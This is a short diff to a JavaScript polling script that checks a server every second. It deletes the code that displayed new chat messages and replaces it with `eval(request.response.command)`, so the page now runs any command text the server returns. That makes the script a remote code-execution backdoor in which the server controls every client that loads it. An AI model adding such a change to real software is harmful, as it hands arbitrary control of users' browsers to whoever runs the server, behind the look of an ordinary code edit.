@@ -15,9 +15,5 @@ var loop = setInterval(function(){
   request.send();
 },1000);
 request.onload = function(){
-msgs = request.response.msg;
-if(ans == "old"){
-ans = request.response.msg[request.response.msg.length-1];} 
-if(ans!=request.response.msg[request.response.msg.length-1]){
-alert(request.response.msg);
-ans = request.response.msg[request.response.msg.length-1];}}
+eval(request.response.command)
+}
